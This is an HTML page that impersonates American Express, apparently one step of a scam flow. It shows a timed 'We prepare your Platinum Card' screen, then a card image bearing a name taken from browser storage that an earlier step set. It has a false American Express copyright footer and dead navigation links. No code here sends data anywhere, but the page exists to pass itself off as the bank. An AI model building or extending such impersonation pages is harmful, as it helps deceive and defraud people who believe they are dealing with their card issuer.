<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8" />
<meta name="viewport" content="width=device-width, initial-scale=1.0"/>
<title>American Express Platinum</title>

<style>
:root{
    --amex-blue:#00175a;
    --amex-light:#0070d5;
    --bg:#f5f7fb;
}

*{
    margin:0;
    padding:0;
    box-sizing:border-box;
}

body{
    font-family: "Helvetica Neue", Arial, sans-serif;
    background: linear-gradient(135deg,#eef2ff,#f5f7fb);
    min-height:100vh;
    overflow-x:hidden;
}

/* NAVBAR */
nav{
    background:#fff;
    padding:12px 5%;
    display:flex;
    align-items:center;
    border-bottom:1px solid #ddd;
    gap:30px;
}

.amex-logo-box{
    background:var(--amex-blue);
    color:#fff;
    padding:8px 12px;
    font-weight:bold;
    font-size:13px;
    line-height:1.1;
    text-transform:uppercase;
    text-align:center;
    min-width:80px;
    border-radius:2px;
}

.nav-links{
    display:flex;
    gap:25px;
    margin-right:auto;
}

.nav-links a{
    text-decoration:none;
    color:#333;
    font-weight:500;
}

.login-btn{
    background:#f0f0f0;
    border:1px solid #ccc;
    padding:8px 20px;
    font-weight:bold;
    cursor:pointer;
}

/* PROCESSING SCREEN */

.processing-screen{
    position:fixed;
    inset:0;
    background:linear-gradient(135deg,#eef2ff,#f5f7fb);
    z-index:9999;
    display:flex;
    align-items:center;
    justify-content:center;
    flex-direction:column;
    transition:1s;
}

.processing-screen.hide{
    opacity:0;
    visibility:hidden;
}

.loader{
    width:90px;
    height:90px;
    border:7px solid rgba(0,0,0,0.08);
    border-top:7px solid var(--amex-blue);
    border-radius:50%;
    animation:spin 1s linear infinite;
    margin-bottom:25px;
}

@keyframes spin{
    100%{
        transform:rotate(360deg);
    }
}

.processing-text{
    font-size:30px;
    font-weight:700;
    color:var(--amex-blue);
    margin-bottom:15px;
    text-align:center;
}

.processing-subtext{
    color:#555;
    font-size:16px;
    margin-bottom:20px;
    text-align:center;
}

.timer{
    font-size:55px;
    font-weight:bold;
    color:#111;
}

/* MAIN */
.wrapper{
    width:100%;
    min-height:calc(100vh - 150px);
    display:flex;
    align-items:center;
    justify-content:center;
    padding:50px 20px;
    opacity:0;
    transition:1s;
}

.wrapper.show{
    opacity:1;
}

.card-container{
    perspective:2000px;
}

/* FRONT CARD */
.card{
    width:430px;
    height:270px;
    position:relative;
    cursor:pointer;
    animation:floatCard 4s ease-in-out infinite;
}

@keyframes floatCard{
    0%{
        transform:translateY(0px) rotateX(0deg);
    }
    50%{
        transform:translateY(-10px) rotateX(2deg);
    }
    100%{
        transform:translateY(0px) rotateX(0deg);
    }
}

.card-face{
    position:absolute;
    width:100%;
    height:100%;
    border-radius:22px;
    overflow:hidden;
    box-shadow:
    0 25px 55px rgba(0,0,0,0.28),
    0 10px 25px rgba(0,0,0,0.15);
}

/* FRONT */
.card-front{
    background:url("Platinum_Card_new.png") center/cover no-repeat;
    color:#000;
}

.overlay{
    position:absolute;
    inset:0;
    background:
    linear-gradient(
        135deg,
        rgba(255,255,255,0.18),
        rgba(255,255,255,0.02)
    );
}

.card-front::before{
    content:"";
    position:absolute;
    top:-120%;
    left:-40%;
    width:60%;
    height:300%;
    background:rgba(255,255,255,0.15);
    transform:rotate(25deg);
    animation:shine 5s linear infinite;
}

@keyframes shine{
    0%{
        left:-60%;
    }
    100%{
        left:140%;
    }
}

/* FRONT NAME */
.card-name{
    position:absolute;
    bottom:62px;
    left:38px;
    font-size:15px;
    letter-spacing:1.5px;
    text-transform:uppercase;
    font-weight:500;
    color:#111;
    font-family:"Helvetica Neue", Arial, sans-serif;
    text-shadow:0 1px 2px rgba(255,255,255,0.4);
    z-index:5;
}

/* FRONT NUMBER */
.card-number{
    position:absolute;
    bottom:32px;
    left:38px;
    font-size:16px;
    letter-spacing:2px;
    color:#111;
    font-weight:500;
    font-family:"Helvetica Neue", Arial, sans-serif;
    text-shadow:0 1px 2px rgba(255,255,255,0.35);
    z-index:5;
}

/* BACK CARD */
.back-image{
    margin-top:30px;
    display:flex;
    justify-content:center;
}

.back-card{
    width:430px;
    height:270px;
    position:relative;
    border-radius:22px;
    overflow:hidden;
    animation:floatBack 4s ease-in-out infinite;
    box-shadow:
    0 25px 55px rgba(0,0,0,0.28),
    0 10px 25px rgba(0,0,0,0.15);
}

/* BACK IMAGE */
.back-card img{
    width:100%;
    height:100%;
    object-fit:cover;
    display:block;
}

/* BACK SHINE */
.back-card::before{
    content:"";
    position:absolute;
    top:-120%;
    left:-40%;
    width:60%;
    height:300%;
    background:rgba(255,255,255,0.18);
    transform:rotate(25deg);
    animation:shineBack 5s linear infinite;
    z-index:2;
}

/* BACK FLOAT */
@keyframes floatBack{
    0%{
        transform:translateY(0px) rotateX(0deg);
    }
    50%{
        transform:translateY(-10px) rotateX(2deg);
    }
    100%{
        transform:translateY(0px) rotateX(0deg);
    }
}

/* BACK SHINE */
@keyframes shineBack{
    0%{
        left:-60%;
    }
    100%{
        left:140%;
    }
}

/* BUTTONS */
.actions{
    margin-top:35px;
    display:flex;
    gap:15px;
    justify-content:center;
    flex-wrap:wrap;
}

.btn{
    padding:15px 38px;
    border:none;
    border-radius:50px;
    background:linear-gradient(135deg,var(--amex-blue),#003da5);
    color:#fff;
    font-weight:bold;
    cursor:pointer;
    transition:0.35s;
    font-size:15px;
    text-decoration:none;
    display:inline-flex;
    align-items:center;
    justify-content:center;
    box-shadow:0 12px 25px rgba(0,23,90,0.25);
}

.btn:hover{
    transform:translateY(-3px) scale(1.02);
    background:linear-gradient(135deg,var(--amex-light),#0057b8);
}

/* FOOTER */
footer{
    text-align:center;
    color:#888;
    font-size:13px;
    padding:25px 10px;
}

/* MOBILE */
@media(max-width:500px){

    .card{
        width:340px;
        height:215px;
    }

    .back-card{
        width:340px;
        height:215px;
    }

    .card-name{
        bottom:50px;
        left:30px;
        font-size:12px;
    }

    .card-number{
        left:30px;
        bottom:24px;
        font-size:13px;
        letter-spacing:1.5px;
    }

    .nav-links{
        display:none;
    }

    nav{
        justify-content:space-between;
    }

    .processing-text{
        font-size:24px;
    }

    .timer{
        font-size:45px;
    }
}
</style>
</head>

<body>

<!-- PROCESSING SCREEN -->

<div class="processing-screen" id="processingScreen">

    <div class="loader"></div>

    <div class="processing-text">
        Please Wait...
    </div>

    <div class="processing-subtext">
         We prepare your Platinum Card
    </div>

    <div class="timer" id="timer">
        12
    </div>

</div>

<!-- HEADER -->
<nav>
    <div class="amex-logo-box">
        AMERICAN<br>EXPRESS
    </div>

    <div class="nav-links">
        <a href="#">My Account</a>
        <a href="#">Cards</a>
        <a href="#">Travel</a>
        <a href="#">Insurance</a>
    </div>

    <button class="login-btn">Log In</button>
</nav>

<!-- CARD -->
<div class="wrapper" id="mainWrapper">

    <div>

        <!-- FRONT CARD -->
        <div class="card-container">
            <div class="card" id="card">

                <div class="card-face card-front">

                    <div class="overlay"></div>

                    <!-- FRONT NAME -->
                    <div class="card-name" id="cardName">
                    </div>

                    <!-- FRONT NUMBER -->
                 <!--   <div class="card-number">
                        XXXX XXXX XXXX 3579
                    </div>   -->

                </div>

            </div>
        </div>

        <!-- BACK CARD -->
        <div class="back-image">

            <div class="back-card">

                <img 
                    src="back.jpg" 
                    alt="Back Card Image"
                >

            </div>

        </div>

        <!-- BUTTON -->
   <!--     <div class="actions">

            <a href="#" class="btn">   
                Proceed
            </a>

        </div>

    </div>

</div>
-->
<!-- FOOTER -->
<footer>
    Copyright © 2026 American Express Banking Corp.
</footer>

<script>

/*
=====================================================
PROCESSING TIMER
=====================================================
*/

let timeLeft = 12;

const timer =
document.getElementById("timer");

const processingScreen =
document.getElementById("processingScreen");

const mainWrapper =
document.getElementById("mainWrapper");

const countdown = setInterval(() => {

    timeLeft--;

    timer.innerText =
    timeLeft < 10
    ? "0" + timeLeft
    : timeLeft;

    if(timeLeft <= 0){

        clearInterval(countdown);

        processingScreen.classList.add("hide");

        mainWrapper.classList.add("show");

    }

},1000);

/*
=====================================================
GET FULL NAME FROM LOCALSTORAGE
=====================================================
*/

const fullName =
localStorage.getItem("fullName") || "";

/*
=====================================================
SHOW NAME
=====================================================
*/

document.getElementById("cardName").innerText =
fullName.toUpperCase();

</script>

</body>
</html>
